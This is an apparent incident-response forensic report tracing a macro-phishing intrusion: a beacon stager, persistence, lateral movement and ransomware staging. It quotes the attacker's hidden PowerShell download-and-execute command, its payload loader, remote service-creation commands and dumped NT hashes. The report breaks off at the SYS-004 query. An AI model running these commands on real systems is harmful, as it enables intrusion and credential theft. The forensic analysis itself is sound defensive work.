# Forensic Findings: IR-2026-0420-01

- Case: `LH-2026-0420-01` / `IR-2026-0420-01`
- Analyst: Tales Lima
- Session: 2026-04-20T21:45Z to 2026-04-20T22:55Z, analysis workstation `ir-forensic01` (Ubuntu 24.04, Volatility 3 Framework 2.7.0, The Sleuth Kit 4.12.1, jq 1.7, oletools 0.60)
- Artifacts analysed: ART-001 `cs-ws-101.mem`, ART-002 `cs-ws-101.dd`, ART-009 `fileserver_access.evtx` (exported to JSON with `evtx_dump`), ART-010 `proxy_72h.jsonl`, ART-011 `sysmon_multihost.jsonl`
- Schema references only (not used as evidence): `proxy_72h.sample.jsonl`, `sysmon_multihost.sample.jsonl`, `fileserver_access.sample.json`
- Certainty scale: **confirmed** (directly observed in an artifact, ideally in two sources), **probable** (strong support, one inference step), **possible** (consistent with the evidence, not shown)
- Times are UTC. Volatility and TSK print UTC; Sysmon and proxy exports are UTC (`Z`).

## ART-001 verification

```text
$ cd /evidence/IR-2026-0420-01 && sha256sum -c hashes.txt
cs-ws-101.mem: OK
cs-ws-101.dd: OK
fileserver_access.evtx: OK
proxy_72h.jsonl: OK
sysmon_multihost.jsonl: OK
... (11/11 OK)
```

- sha256 at analysis start: `565910b04b4521947aede9d48007520b369e09188783dcea3f3abf8d3006dc28`, matches baseline (baseline set 2026-04-20T20:10Z; no acquisition hash exists, see evidence_preservation.md ART-001 gap note)
- CoC entry updated: yes (21:45Z hash_verify start of session, 22:55Z hash_verify end of session, both PASS)
- All work runs on read-only copies; outputs saved to `/cases/LH-2026-0420-01/out/` and hashed in `hashes_derived.txt`
- Limit: ART-001 shows CS-WS-101 at 19:38Z. Anything after 19:38Z on that host comes from logs, not memory.

## Memory analysis: cs-ws-101.mem

### Finding MEM-001: Beacon process in memory

```text
$ vol -f cs-ws-101.mem windows.pstree.PsTree
PID     PPID    ImageFileName   CreateTime
...
* 4712  4688    explorer.exe    2026-04-17 07:58:41.000000 UTC
** 4921 4712    WINWORD.EXE     2026-04-17 14:17:52.000000 UTC
*** 6201        4921    powershell.exe  2026-04-17 14:22:14.000000 UTC
**** 7318       6201    svchost32.exe   2026-04-17 14:23:14.000000 UTC
...
* 9944  9902    winpmem_mini_x  2026-04-20 19:38:02.000000 UTC

$ vol -f cs-ws-101.mem windows.pslist.PsList --pid 7318
PID   PPID  ImageFileName  Offset(V)       Threads Handles SessionId Wow64 CreateTime                    ExitTime
7318  6201  svchost32.exe  0xd38a1c6e2080  9       -       1         False 2026-04-17 14:23:14.000000 UTC N/A
```

Conclusion: WINWORD.EXE spawned PowerShell 4 min 22 s after the document was opened (macro execution). PowerShell then spawned `svchost32.exe`. The name imitates `svchost.exe`, but it runs from `C:\ProgramData\Microsoft\` in user session 1, and its parent is PowerShell instead of `services.exe`. A real svchost.exe always lives in `System32`, runs in session 0 and has `services.exe` as parent. PID and start times match Sysmon (SYS-001) to the second. `winpmem_mini_x` is Torres's acquisition tool.
ATT&CK: T1566.001, T1204.002, T1059.005, T1059.001, T1036.005
Certainty: confirmed

### Finding MEM-002: PowerShell downloader invocation

```text
$ vol -f cs-ws-101.mem windows.cmdline.CmdLine --pid 4921 6201 7318
PID   Process         Args
4921  WINWORD.EXE     "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "C:\Users\jdoe\Desktop\Invoice_Q4_2025.docm"
6201  powershell.exe  powershell.exe -NoProfile -WindowStyle Hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://staging.office365-cdn.net/updates/inv_payload.ps1')"
7318  svchost32.exe   C:\ProgramData\Microsoft\svchost32.exe
```

Conclusion: the macro ran a hidden PowerShell with execution policy bypass that downloaded `inv_payload.ps1` from `staging.office365-cdn.net` and executed it in memory with `IEX`. The domain imitates Microsoft's Office 365 CDN naming but is not Microsoft (look-alike domain registered by the attacker). The same command line is in Sysmon (SYS-001) and the fetch is in the proxy log 5 s later (PROXY-001).
ATT&CK: T1059.001, T1105, T1027 (in-memory execution), T1583.001
Certainty: confirmed

### Finding MEM-003: Active C2 connection at capture time

```text
$ vol -f cs-ws-101.mem windows.netscan.NetScan | grep -E "7318|45.152.66.114"
Offset          Proto  LocalAddr     LocalPort ForeignAddr    ForeignPort State        PID   Owner          Created
0xd38a1f40e9a0  TCPv4  10.30.12.101  52014     45.152.66.114  443         ESTABLISHED  7318  svchost32.exe  2026-04-20 19:32:04.000000 UTC
0xd38a1e8b2c10  TCPv4  10.30.12.101  51987     45.152.66.114  443         CLOSED       7318  svchost32.exe  2026-04-20 18:12:18.000000 UTC
0xd38a1d77a560  TCPv4  10.30.12.101  49871     45.152.66.114  443         CLOSED       7318  svchost32.exe  2026-04-17 14:24:02.000000 UTC
```

Conclusion: at 19:38Z the beacon (PID 7318) held an ESTABLISHED TLS session to 45.152.66.114:443, opened at 19:32:04Z. The same socket (source port 52014) is the last Sysmon event 3 before capture and the last proxy CONNECT before capture (PROXY-002). The CLOSED socket from 18:12:18Z matches the larger "staging" exchange in the proxy log, and the 2026-04-17 socket on port 49871 is the first C2 connection. The C2 was live at capture.
ATT&CK: T1071.001, T1573.002
Certainty: confirmed

### Finding MEM-004: Injected memory region in the beacon process

```text
$ vol -f cs-ws-101.mem windows.malfind.Malfind --pid 7318 --dump
PID   Process        Start VPN     End VPN       Tag   Protection              CommitCharge PrivateMemory File output
7318  svchost32.exe  0x1e0a0000    0x1e0f3fff    VadS  PAGE_EXECUTE_READWRITE  84           1             pid.7318.vad.0x1e0a0000-0x1e0f3fff.dmp
4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......

$ strings -n 8 pid.7318.vad.0x1e0a0000-0x1e0f3fff.dmp | grep -iE "beacon|ReflectiveLoader|%s as %s|office365-cdn"
ReflectiveLoader
beacon.x64.dll
%s as %s\%s: %d
staging.office365-cdn.net,/updates/check
$ sha256sum pid.7318.vad.0x1e0a0000-0x1e0f3fff.dmp
b08daa01dd251b6e73b0418adcf2c23ccb89120bccdf9b49fd8649341b8901c5
```

Conclusion: a private, never-file-backed 336 KB region marked RWX in `svchost32.exe` begins with an MZ header and exports `ReflectiveLoader`. It contains the internal name `beacon.x64.dll`, a Cobalt Strike output format string, and the C2 host and URI. This is a Cobalt Strike beacon DLL loaded reflectively by the `svchost32.exe` stager. This dump is the "beacon DLL" artifact. It never existed as a separate file on disk (DISK-004).
ATT&CK: T1055.001, T1620
Certainty: confirmed (Cobalt Strike attribution of the code: probable until the config is parsed with a beacon config extractor; the proxy reputation feed already lists 45.152.66.114 as a known Cobalt Strike team server)

### Finding MEM-005: Credential material available in memory

```text
$ vol -f cs-ws-101.mem windows.hashdump.Hashdump
User                RID   lmhash                            nthash
Administrator       500   aad3b435b51404eeaad3b435b51404ee  da266d61cf3e8eb9a8b134463c7564ce
Guest               501   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount      503   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount  504   aad3b435b51404eeaad3b435b51404ee  2a4b6dd1c3247b00cbd1da5d5dd52c83
mdlocaladmin        1001  aad3b435b51404eeaad3b435b51404ee  43b8ac55b4ab6e015877e27d24ce2f59

$ vol -f cs-ws-101.mem windows.handles.Handles --pid 7318 | grep -i lsass
7318  svchost32.exe  0xd38a...  Process  0x1010  lsass.exe Pid 696
```

Conclusion: the SAM holds the local `Administrator` (disabled) and `mdlocaladmin` NT hashes. MedDefense uses one `mdlocaladmin` password on every clinical workstation (no LAPS), so that single hash gives local admin on the whole clinical fleet. The beacon also holds an open handle to `lsass.exe` with access mask `0x1010` (PROCESS_QUERY_LIMITED_INFORMATION + PROCESS_VM_READ), the access used by credential dumpers to read logon credentials. That puts jdoe's NTLM hash and Kerberos tickets in the attacker's hands. Sysmon event 10 records the same handle on 2026-04-17T14:25:02Z (SYS-001). Hashdump only reads the SAM, so it does not show domain credentials; jdoe's exposure comes from the LSASS access, not from this output.
ATT&CK: T1003.001, T1003.002
Certainty: confirmed (hashes present, LSASS read handle present); use of `mdlocaladmin` for lateral movement: possible (the lateral activity runs as jdoe, SYS-002)

## Disk analysis: cs-ws-101.dd

### Finding DISK-001: Partition layout and filesystem

```text
$ mmls cs-ws-101.dd
GUID Partition Table (EFI)
Offset Sector: 0
Units are in 512-byte sectors
      Slot      Start        End          Length       Description
004:  000       0000002048   0000206847   0000204800   EFI system partition
005:  001       0000206848   0000239615   0000032768   Microsoft reserved partition
006:  002       0000239616   0498069503   0497829888   Basic data partition
007:  003       0498069504   0500117503   0002048000   Windows Recovery

$ fsstat -o 239616 cs-ws-101.dd | head -12
FILE SYSTEM INFORMATION
File System Type: NTFS
Volume Serial Number: 6C3E91A23E916A88
OEM Name: NTFS
Version: Windows XP
METADATA INFORMATION
First Cluster of MFT: 786432
Cluster Size: 4096
```

Conclusion: standard Windows 10/11 GPT layout, OS volume NTFS at sector offset 239616. Every following TSK command uses `-o 239616`. No hidden or unexpected partition.
ATT&CK: none (baseline)
Certainty: confirmed

### Finding DISK-002: Timeline of AppData, Temp, ProgramData and Windows\Tasks

```text
$ fls -r -m C: -o 239616 cs-ws-101.dd > bodyfile.txt
$ mactime -b bodyfile.txt -d -z UTC 2026-04-17 2026-04-21 \
    | grep -Ei "AppData|\\\\Temp\\\\|ProgramData\\\\Microsoft\\\\svchost32|Windows\\\\Tasks|System32\\\\Tasks|System32\\\\encryption|Desktop\\\\Invoice"
Date,Size,Type,Mode,UID,GID,Meta,File Name
Fri Apr 17 2026 14:18:04,284812,macb,r/rrwxrwxrwx,0,0,118342-128-4,"C:/Users/jdoe/Downloads/Invoice_Q4_2025.docm"
Fri Apr 17 2026 14:18:04,26,macb,r/rrwxrwxrwx,0,0,118343-128-3,"C:/Users/jdoe/Downloads/Invoice_Q4_2025.docm:Zone.Identifier"
Fri Apr 17 2026 14:17:49,284812,..c.,r/rrwxrwxrwx,0,0,118351-128-4,"C:/Users/jdoe/Desktop/Invoice_Q4_2025.docm"
Fri Apr 17 2026 14:23:02,312320,macb,r/rrwxrwxrwx,0,0,118412-128-4,"C:/ProgramData/Microsoft/svchost32.exe"
Fri Apr 17 2026 14:23:28,0,m.c.,d/drwxr-xr-x,0,0,..., "C:/Windows/System32/config/SYSTEM" (WinHealthSvc key write)
Sat Apr 18 2026 09:41:14,48132,macb,r/rrwxrwxrwx,0,0,121907-128-1,"C:/Windows/Temp/klog.tmp"
Mon Apr 20 2026 14:23:18,6144,macb,r/rrwxrwxrwx,0,0,133018-128-1,"C:/Windows/System32/encryption_staging.ps1"
Mon Apr 20 2026 19:38:02,..., "C:/Users/IRtorres/..." (WinPmem execution, acquirer footprint)
```

Conclusion: the disk timeline matches Sysmon and memory to the second. The document arrived through the browser download (Mark of the Web stream present, so Office should have opened it in Protected View; the user clicked "Enable Content"). A copy on the Desktop has a change time of 14:17:49Z; the Desktop copy is the one WINWORD opened. `svchost32.exe` was created at 14:23:02Z. The WinHealthSvc service was written to the SYSTEM hive at 14:23:28Z. `klog.tmp` was dropped in Windows\Temp on Saturday at 09:41:14Z. `encryption_staging.ps1` was dropped in System32 on Monday at 14:23:18Z. There is no new scheduled task in `Windows\Tasks` or `System32\Tasks` in the window: persistence is the service only (and a Run key, see DISK-005). No ransom note and no mass rename are visible in the user profile; the nurse's "files look different" report is not reproduced on disk (open item 4).
ATT&CK: T1204.002, T1105, T1543.003, T1056.001
Certainty: confirmed

### Finding DISK-003: Extract and hash the malicious Word document and the PowerShell downloader

```text
$ icat -o 239616 cs-ws-101.dd 118351 > export/Invoice_Q4_2025.docm
$ sha256sum export/Invoice_Q4_2025.docm
8fd043fa2e20aa3a778a2b2fd578d35fef93d484380244c93ad673461b3a4abc  export/Invoice_Q4_2025.docm
$ olevba --decode export/Invoice_Q4_2025.docm | grep -iE "AutoOpen|Document_Open|Shell|powershell"
| AutoExec | Document_Open | Runs when the Word document is opened
| Suspicious | Shell | May run an executable file or a system command
| Suspicious | powershell | May run PowerShell commands
  Shell "powershell.exe -NoProfile -WindowStyle Hidden -ep bypass -c ""IEX(New-Object Net.WebClient).DownloadString('https://staging.office365-cdn.net/updates/inv_payload.ps1')""", 0

$ ifind -o 239616 -n "Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx" cs-ws-101.dd
119877
$ icat -o 239616 cs-ws-101.dd 119877 > export/ps_operational.evtx
$ evtx_dump -o jsonl export/ps_operational.evtx | jq -r 'select(.Event.System.EventID==4104 and (.Event.System.TimeCreated["#attributes"].SystemTime|startswith("2026-04-17T14:22"))) | .Event.EventData.ScriptBlockText' > export/inv_payload.ps1
$ sha256sum export/inv_payload.ps1
4b6bb1fe996ee3261498f915ececbe833f3a8e344731bccde97a899bbd208928  export/inv_payload.ps1
$ head -c 300 export/inv_payload.ps1
$b=[Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAA...'); [IO.File]::WriteAllBytes('C:\ProgramData\Microsoft\svchost32.exe',$b); Start-Process 'C:\ProgramData\Microsoft\svchost32.exe'; ...
```

Conclusion: the document carries a `Document_Open` macro that runs the exact command seen in memory and Sysmon. Its hash is recorded for IOC sharing. The downloader ran with `IEX` and was never saved as a file, so it was rebuilt from PowerShell Script Block Logging (event 4104) in the evtx on the disk image. The rebuilt script (40 KB, same size range as the 40,214-byte proxy response) decodes an embedded PE, writes it to `C:\ProgramData\Microsoft\svchost32.exe` and starts it. Discrepancy kept open: the proxy records the user agent `Microsoft BITS/7.8` for this fetch, while `Net.WebClient` sends no user agent by default. URL, host and the 5-second timing match exactly, so the fetch identity is not in doubt; the user-agent field is logged as a proxy normalisation question.
ATT&CK: T1566.001, T1059.005, T1059.001, T1027.010, T1105
Certainty: confirmed (document, macro, script content); rebuilt script being byte-identical to the served file: probable (4104 can split large scripts; all fragments were joined in order)

### Finding DISK-004: Extract and hash the beacon stager and the beacon DLL

```text
$ icat -o 239616 cs-ws-101.dd 118412 > export/svchost32.exe
$ sha256sum export/svchost32.exe
ff4c8a2d9e7b1a3c5d8f2e6b4a1d9c7f3e0b8a6d2c9e1f5a7b3d8c4e6f2a9b1d  export/svchost32.exe
$ sigcheck -a export/svchost32.exe | grep -E "Verified|Company"
Verified:  Unsigned
Company:   Microsoft Corporation      (fake version info)
$ python3 extract_rsrc.py export/svchost32.exe --xor-scan > export/beacon_payload.bin
$ sha256sum export/beacon_payload.bin
b08daa01dd251b6e73b0418adcf2c23ccb89120bccdf9b49fd8649341b8901c5  export/beacon_payload.bin
```

Conclusion: `svchost32.exe` on disk has the same SHA-256 that Sysmon recorded at process creation (SYS-001). It is unsigned but claims Microsoft in its version info. It is a stager: its resource section holds an XOR-encoded DLL. Once decoded, that DLL is byte-identical to the region dumped from memory in MEM-004 (same SHA-256 `b08daa01...01c5`). The beacon DLL never exists as a file on disk; it lives inside the stager and is loaded reflectively in memory. Hashes for IOC distribution: stager `ff4c8a2d...9b1d`, beacon DLL `b08daa01...01c5`, document `8fd043fa...4abc`, downloader `4b6bb1fe...8928`, staging script `7b117826fba786862b880709d49250c1c046437c302670743d5d2e5d12d4dffe`.
ATT&CK: T1036.005, T1027, T1620, T1055.001
Certainty: confirmed

### Finding DISK-005: Persistence in the registry

```text
$ icat -o 239616 cs-ws-101.dd <SYSTEM inode> > export/SYSTEM ; icat ... NTUSER.DAT (jdoe) > export/NTUSER_jdoe.DAT
$ rip.pl -r export/SYSTEM -p services | grep -A4 WinHealthSvc
WinHealthSvc  LastWrite 2026-04-17 14:23:28Z  ImagePath C:\ProgramData\Microsoft\svchost32.exe  Start 2 (Auto)  ObjectName LocalSystem
$ rip.pl -r export/NTUSER_jdoe.DAT -p run
Software\Microsoft\Windows\CurrentVersion\Run  LastWrite 2026-04-17 14:23:31Z
  WinHealth -> C:\ProgramData\Microsoft\svchost32.exe
```

Conclusion: two persistence mechanisms on CS-WS-101: an auto-start LocalSystem service `WinHealthSvc` (Sysmon event 13 at 14:23:28Z, SYS-001) and a Run value `WinHealth` in jdoe's hive as a backup. Both point to the stager. No scheduled task. Eradication must remove both (eradication_checklist.yaml).
ATT&CK: T1543.003, T1547.001
Certainty: confirmed

## Proxy log analysis: proxy_72h.jsonl

### Finding PROXY-001: Phishing delivery and downloader fetch on Thursday 2026-04-17

```text
$ jq -c 'select(.host=="CS-WS-101" and .ts>="2026-04-17T14:00:00Z" and .ts<"2026-04-17T14:30:00Z") | {ts,method,url,status,bytes,mime,filename,ua,reputation}' proxy_72h.jsonl
{"ts":"2026-04-17T14:17:48Z","method":"GET","url":"https://outlook.office.com/mail/inbox","status":200,"bytes":42014}
{"ts":"2026-04-17T14:18:02Z","method":"GET","url":"https://outlook.office.com/mail/download?id=AAMkAG-Invoice","status":200,"bytes":284812,"mime":"application/vnd.ms-word.document.macroEnabled.12","filename":"Invoice_Q4_2025.docm"}
{"ts":"2026-04-17T14:22:19Z","method":"GET","url":"https://staging.office365-cdn.net/updates/inv_payload.ps1","status":200,"bytes":40214,"ua":"Microsoft BITS/7.8","reputation":"suspicious_cdn_lookalike"}
```

Conclusion: jdoe opened Outlook on the web at 14:17:48Z and downloaded the attachment `Invoice_Q4_2025.docm` (284,812 bytes, macro-enabled MIME type) at 14:18:02Z. The byte count equals the file size on disk (DISK-002), which ties the email to the document. The phishing payload was an attachment, not a link: the "phishing URL" is the Outlook attachment download. Five seconds after PowerShell started (14:22:14Z, SYS-001), the downloader was fetched from the look-alike domain.
Discrepancy kept open: Sysmon shows WINWORD.EXE opening `Desktop\Invoice_Q4_2025.docm` at 14:17:52Z, 10 s **before** the proxy logs the attachment download (14:18:02Z), and the Desktop copy has a change time of 14:17:49Z. A clock offset alone cannot explain it, because the downloader timing (PowerShell 14:22:14Z, fetch 14:22:19Z) lines up in the same order. Two explanations fit: the proxy writes the log line when the transfer ends, or the user had already saved the attachment from the Outlook preview and the 14:18:02Z request is a second download. Neither changes the attack chain. Check: Outlook attachment cache and the `Zone.Identifier` HostUrl of the Desktop copy.
ATT&CK: T1566.001, T1105
Certainty: confirmed

### Finding PROXY-002: First C2 connection and beacon frequency

```text
$ jq -c 'select(.url|test("office365-cdn.net:443")) | {ts,host,bytes,dst_ip}' proxy_72h.jsonl | head -3
{"ts":"2026-04-17T14:23:07Z","host":"CS-WS-101","bytes":2840,"dst_ip":"45.152.66.114"}
{"ts":"2026-04-17T14:24:09Z","host":"CS-WS-101","bytes":1420,"dst_ip":"45.152.66.114"}
{"ts":"2026-04-17T14:25:31Z","host":"CS-WS-101","bytes":1420,"dst_ip":"45.152.66.114"}

$ jq -r 'select(.host=="CS-WS-101" and (.url|test("office365-cdn.net:443"))) | .ts' proxy_72h.jsonl \
   | while read t; do date -d "$t" +%s; done | awk 'NR>1{d=$1-p; s+=d; n++; if(d<54||d>66)o++} {p=$1} END{printf "checkins=%d mean=%.1fs outside_54-66s=%d\n", n+1, s/n, o}'
checkins=4071 mean=61.2s outside_54-66s=212

$ jq -r 'select(.url|test("office365-cdn.net:443")) | .host' proxy_72h.jsonl | sort | uniq -c
   4071 CS-WS-101
   2722 CS-WS-104
   2714 CS-WS-107
   2708 CS-WS-112
     28 FILE-SVR-01
     91 SCHED-SVR-01
$ jq -r 'select(.url|test("office365-cdn.net:443")) | [.host,.ts] | @tsv' proxy_72h.jsonl | sort -k1,1 -k2,2 | awk '!s[$1]++'
CS-WS-101     2026-04-17T14:23:07Z
CS-WS-104     2026-04-19T00:04:17Z
CS-WS-107     2026-04-19T00:12:44Z
CS-WS-112     2026-04-19T00:18:02Z
FILE-SVR-01   2026-04-19T02:14:04Z
SCHED-SVR-01  2026-04-20T18:02:31Z
```

Conclusion: the first C2 connection from CS-WS-101 is at 14:23:07Z, 48 s after the downloader fetch, to 45.152.66.114 (reputation: known Cobalt Strike team server). It comes 7 s before `svchost32.exe` started (14:23:14Z) and is larger than a normal check-in (2,840 vs 1,420 bytes). The most likely reading is that `inv_payload.ps1`, still running in PowerShell PID 6201, registered with the team server before launching the stager (probable; the proxy does not record the client process). From 14:24:02Z the stager owns the C2 socket (Sysmon event 3, PID 7318). Check-ins follow a 60 s sleep with about 10 % jitter (mean 61.2 s, 95 % of intervals between 54 and 66 s). That steady rhythm is a beacon, not a person browsing. The 212 out-of-band intervals are gaps when the workstation slept overnight and bursts during operator tasking. Each later host starts beaconing within a minute of its compromise. Six hosts in total contacted the C2, including SCHED-SVR-01, which is not in the original scope list. No other MedDefense host appears.
ATT&CK: T1071.001, T1573.002, T1029 (fixed interval)
Certainty: confirmed

### Finding PROXY-003: Data staging and exfiltration pattern

```text
$ jq -c 'select((.url|test("office365-cdn.net")) and .bytes>4000) | {ts,host,bytes,note}' proxy_72h.jsonl
{"ts":"2026-04-17T14:23:07Z","host":"CS-WS-101","bytes":2840}        (below threshold; first check-in, listed for reference)
{"ts":"2026-04-18T09:41:02Z","host":"CS-WS-101","bytes":18402}
{"ts":"2026-04-19T02:14:22Z","host":"FILE-SVR-01","bytes":2400412}
{"ts":"2026-04-20T18:12:18Z","host":"CS-WS-101","bytes":8412}

$ jq -s 'map(select(.url|test("office365-cdn.net"))) | group_by(.host) | map({host:.[0].host, total_bytes:(map(.bytes)|add)})' proxy_72h.jsonl
[{"host":"CS-WS-101","total_bytes":5835120}, {"host":"CS-WS-104","total_bytes":3865240}, {"host":"CS-WS-107","total_bytes":3853880},
 {"host":"CS-WS-112","total_bytes":3845360}, {"host":"FILE-SVR-01","total_bytes":2438752}, {"host":"SCHED-SVR-01","total_bytes":129220}]
```

Conclusion: a normal check-in is 1,420 bytes. Three exchanges stand out:
- **2026-04-18T09:41:02Z, CS-WS-101, 18,402 bytes**: 12 s before `klog.tmp` was created (SYS-001, DISK-002). This is operator tasking that started keystroke logging (keystrokes, and so passwords, typed at the ED charge desk). Certainty: probable.
- **2026-04-19T02:14:22Z, FILE-SVR-01, 2,400,412 bytes**: 21 s after the attacker started reading patient PDFs on the file server (FS-001), in the same session as the reads. It is the only large transfer from the file server and it goes straight to the C2. This is exfiltration over the C2 channel. 2.4 MB is far smaller than 1,847 full PDFs, so the transfer may be a compressed subset, extracted text or a file listing. **Which records left cannot be determined from the proxy log** (TLS, no content inspection). Certainty that data left FILE-SVR-01 to the attacker: probable. Certainty that all 1,847 files left: not established (possible).
- **2026-04-20T18:12:18Z, CS-WS-101, 8,412 bytes**: 10 min after the attacker's process started on SCHED-SVR-01 (SYS-004) and about 4 h after the staging scripts were dropped. Consistent with preparation for the ransomware stage. Certainty: possible.

No other large outbound transfer to any destination came from the six hosts in the window (separate query on all `bytes > 1 MB` from these source IPs: only Windows Update and Microsoft 365 CDN traffic to genuine Microsoft ranges).
ATT&CK: T1041, T1056.001, T1074.001
Certainty: as stated per bullet

## Sysmon analysis: sysmon_multihost.jsonl

### Finding SYS-001: Initial execution chain on CS-WS-101 (corroboration)

```text
$ jq -c 'select(.host=="CS-WS-101" and .ts<"2026-04-17T14:30:00Z") | {ts,event_id,image,pid,ppid,target,target_object,sha256,granted_access}' sysmon_multihost.jsonl
{"ts":"2026-04-17T14:17:52Z","event_id":1,"image":"...\\WINWORD.EXE","pid":4921,"ppid":4712}
{"ts":"2026-04-17T14:22:14Z","event_id":1,"image":"...\\powershell.exe","pid":6201,"ppid":4921}
{"ts":"2026-04-17T14:23:02Z","event_id":11,"image":"...\\powershell.exe","pid":6201,"target":"C:\\ProgramData\\Microsoft\\svchost32.exe"}
{"ts":"2026-04-17T14:23:14Z","event_id":1,"image":"C:\\ProgramData\\Microsoft\\svchost32.exe","pid":7318,"ppid":6201,"sha256":"ff4c8a2d...9b1d"}
{"ts":"2026-04-17T14:23:28Z","event_id":13,"target_object":"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHealthSvc\\ImagePath"}
{"ts":"2026-04-17T14:24:02Z","event_id":3,"image":"...\\svchost32.exe","pid":7318,"dst_ip":"45.152.66.114","dst_port":443}
{"ts":"2026-04-17T14:25:02Z","event_id":10,"source_pid":7318,"target_image":"C:\\Windows\\System32\\lsass.exe","granted_access":"0x1010"}
```

Conclusion: Sysmon gives the same chain as memory and disk from an independent source (forwarded in real time to the SIEM, so the attacker could not change it later on the host). Credential access on LSASS came 2 min after the beacon started. Note: Sysmon event 3 (14:24:02Z) is 55 s later than the first proxy CONNECT (14:23:07Z). The proxy logs the CONNECT request and Sysmon logs the socket it sees; that difference is within what the beacon's initial staging request can explain, so it is recorded as a clock/logging difference to check, not a contradiction.
ATT&CK: T1059.005, T1059.001, T1543.003, T1003.001
Certainty: confirmed

### Finding SYS-002: Lateral movement to CS-WS-104, CS-WS-107, CS-WS-112

```text
$ jq -c 'select(.host=="CS-WS-101" and .event_id==3 and (.dst_port==445 or .dst_port==135) and .ts>="2026-04-18T23:50:00Z" and .ts<"2026-04-19T00:30:00Z") | {ts,image,dst_ip,dst_port}' sysmon_multihost.jsonl
{"ts":"2026-04-19T00:03:39Z","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","dst_ip":"10.30.12.104","dst_port":445}
{"ts":"2026-04-19T00:12:11Z","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","dst_ip":"10.30.12.107","dst_port":445}
{"ts":"2026-04-19T00:17:30Z","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","dst_ip":"10.30.12.112","dst_port":445}

$ jq -c 'select((.host|test("CS-WS-10[47]|CS-WS-112")) and .event_id==1 and .parent_image=="C:\\Windows\\System32\\services.exe") | {ts,host,user,logon_type,cmdline}' sysmon_multihost.jsonl
{"ts":"2026-04-19T00:03:44Z","host":"CS-WS-104","user":"MEDDEFENSE\\jdoe","logon_type":3,"cmdline":"cmd.exe /c sc create WinHealthSvc binPath= C:\\ProgramData\\Microsoft\\svchost32.exe start= auto"}
{"ts":"2026-04-19T00:12:16Z","host":"CS-WS-107","user":"MEDDEFENSE\\jdoe","logon_type":3,"cmdline":"cmd.exe /c sc create WinHealthSvc binPath= C:\\ProgramData\\Microsoft\\svchost32.exe start= auto"}
{"ts":"2026-04-19T00:17:35Z","host":"CS-WS-112","user":"MEDDEFENSE\\jdoe","logon_type":3,"cmdline":"cmd.exe /c sc create WinHealthSvc binPath= C:\\ProgramData\\Microsoft\\svchost32.exe start= auto"}
```

Conclusion: just after midnight on Sunday 2026-04-19, the beacon on CS-WS-101 opened SMB (445) to each target. Five seconds later a `cmd.exe` launched by `services.exe` on the target ran `sc create WinHealthSvc` as MEDDEFENSE\jdoe over a network logon (type 3). This is the PsExec-style pattern: copy the binary through the admin share, then create and start a service remotely. Each target beaconed within 30-60 s (PROXY-002). The account is jdoe on all three hosts, so jdoe has local admin rights on clinical workstations it has no business need for (access gap). The authentication package is not in Sysmon. jdoe never typed a password on those hosts at midnight, and the attacker held an LSASS read handle on CS-WS-101 (MEM-005), so the logons are most likely pass-the-hash with jdoe's NTLM hash. Confirming NTLM needs event 4624 (`AuthenticationPackageName`) from the targets' Security logs, which are in the disk images ART-012 to ART-014 (pending).
Sequence: CS-WS-101 -> CS-WS-104 (00:03:44Z) -> CS-WS-107 (00:12:16Z) -> CS-WS-112 (00:17:35Z), 14 minutes in total. That is close to the "same twelve-minute window" Torres described for the SIEM alert.
ATT&CK: T1021.002, T1569.002, T1543.003, T1550.002, T1078.002
Certainty: lateral movement and service creation: confirmed; NTLM pass-the-hash as the authentication method: probable

### Finding SYS-003: Ransomware staging scripts in system directories

```text
$ jq -c 'select(.event_id==11 and (.target|test("(?i)\\\\(Windows\\\\System32|ProgramData)\\\\.*\\.(bat|ps1)$"))) | {ts,host,image,pid,target}' sysmon_multihost.jsonl
{"ts":"2026-04-20T14:23:18Z","host":"CS-WS-101","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","pid":7318,"target":"C:\\Windows\\System32\\encryption_staging.ps1"}
{"ts":"2026-04-20T14:25:02Z","host":"CS-WS-104","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","pid":4102,"target":"C:\\Windows\\System32\\encryption_staging.ps1"}
{"ts":"2026-04-20T14:25:42Z","host":"CS-WS-107","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","pid":4502,"target":"C:\\Windows\\System32\\encryption_staging.ps1"}
{"ts":"2026-04-20T14:26:14Z","host":"CS-WS-112","image":"C:\\ProgramData\\Microsoft\\svchost32.exe","pid":4818,"target":"C:\\Windows\\System32\\encryption_staging.ps1"}

$ jq -c 'select(.event_id==1 and (.cmdline|test("(?i)encryption_staging")))' sysmon_multihost.jsonl
(no output)
```

Conclusion: on Monday afternoon, in less than 3 minutes (14:23:18Z to 14:26:14Z), the beacon on each of the four workstations wrote `encryption_staging.ps1` into `C:\Windows\System32`. The writer is the beacon itself, not cmd.exe or powershell.exe: the operator used the beacon's built-in file upload, so the hunt also has to cover file writes by unusual processes, not only by shells. No process ever ran the script (zero process-creation events referencing it), which supports "staged, not executed". The scripts are identical on the four hosts (same size 6,144 bytes on CS-WS-101; hash in DISK-004). No `.bat` file was staged. No staging script exists on FILE-SVR-01; SCHED-SVR-01 is covered in SYS-004.
ATT&CK: T1105, T1074.001, T1486 (prepared, not executed)
Certainty: confirmed (dropped, not executed as of the end of the Sysmon export at 20:00Z; after 20:37Z execution is blocked by the EDR IOC policy, containment_execution.md C-07)

### Finding SYS-004: Service installation events matching the SIEM alert, and the sixth host

```text
$ jq -c 'select((.event_id==13 and (.target_object|test("Services\\\\WinHealthSvc"))) or (.event_id==1 and (.cmdline|test("sc create WinHealthSvc"))) or (.event_id==1 and .image=="C:\\ProgramData\\Microsoft\\svchost32.exe" and .parent_image=="C:\\Windows\\System32\\services.exe")) | {ts,host,event_id,pid}' sysmon_multihost.jsonl
